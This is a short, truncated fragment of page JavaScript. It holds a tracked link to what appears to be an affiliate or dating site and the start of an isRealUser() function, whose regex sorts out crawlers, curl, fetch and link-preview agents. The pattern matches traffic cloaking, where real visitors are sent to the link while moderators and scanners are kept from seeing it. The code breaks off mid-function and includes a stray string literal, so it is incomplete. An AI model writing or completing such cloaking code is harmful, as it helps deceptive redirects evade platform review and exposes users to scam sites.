  <script>

      "https://grzvkg.amurllove.com/?utm_source=da57dc555e50572d&ban=tiktok&j1=1&s1=212364&s2=2151270"

    function isRealUser() {

      const botKeywords = /bot|crawler|spider|curl|fetch|preview/i;
